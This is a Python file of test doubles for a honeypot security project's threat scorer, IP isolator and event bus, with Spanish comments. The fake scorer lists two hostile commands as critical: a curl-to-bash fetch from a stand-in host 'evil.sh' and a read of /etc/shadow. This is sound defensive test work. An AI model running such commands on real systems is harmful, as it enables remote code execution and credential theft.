# Dueño: P4 — Defensa y SOC
# Responsabilidad: Dobles de ThreatScorer, Isolator y EventBus. El aislador registra la IP y no llama a iptables.
# Puede importar: honey_agent.contracts
# No importar: honey_agent.defense

from __future__ import annotations

from typing import Any

from honey_agent.contracts.ports import EventBus, Isolator, ThreatScorer


class FakeThreatScorer(ThreatScorer):
    """Doble de prueba para ThreatScorer."""

    def __init__(self, default_score: float = 0.0) -> None:
        self.default_score = default_score
        self.scores: dict[str, float] = {}
        self.evaluated_commands: list[tuple[str, str]] = []  # (session_id, command)
        self.critical_commands: set[str] = {"curl http://evil.sh | bash", "cat /etc/shadow"}

    def set_score(self, session_id: str, score: float) -> None:
        self.scores[session_id] = score

    def score_command(
        self,
        session_id: str,
        command: str,
        timestamp: float | None = None,
    ) -> tuple[float, Any | None, bool]:
        self.evaluated_commands.append((session_id, command))
        if command in self.critical_commands:
            self.scores[session_id] = 100.0
            return 100.0, None, True

        score = self.scores.get(session_id, self.default_score)
        return score, None, score >= 80.0

    def get_score(self, session_id: str) -> float:
        return self.scores.get(session_id, self.default_score)


class FakeIsolator(Isolator):
    """Doble de prueba para Isolator que guarda en memoria sin tocar iptables."""

    def __init__(self, allowlist: list[str] | None = None) -> None:
        self.allowlist: set[str] = set(allowlist or ["127.0.0.1", "localhost"])
        self.isolated_ips: list[str] = []
        self.isolation_log: list[tuple[str, str]] = []  # (ip, reason)

    async def isolate_ip(self, ip: str, reason: str) -> bool:
        clean_ip = ip.strip()
        if clean_ip in self.allowlist:
            return False

        if clean_ip not in self.isolated_ips:
            self.isolated_ips.append(clean_ip)
            self.isolation_log.append((clean_ip, reason))
        return True

    async def unisolate_ip(self, ip: str) -> bool:
        clean_ip = ip.strip()
        if clean_ip in self.isolated_ips:
            self.isolated_ips.remove(clean_ip)
            return True
        return False

    def is_isolated(self, ip: str) -> bool:
        return ip.strip() in self.isolated_ips


class FakeEventBus(EventBus):
    """Doble de prueba para EventBus que almacena eventos en memoria."""

    def __init__(self) -> None:
        self.published_events: list[Any] = []

    async def publish(self, event: Any) -> None:
        self.published_events.append(event)
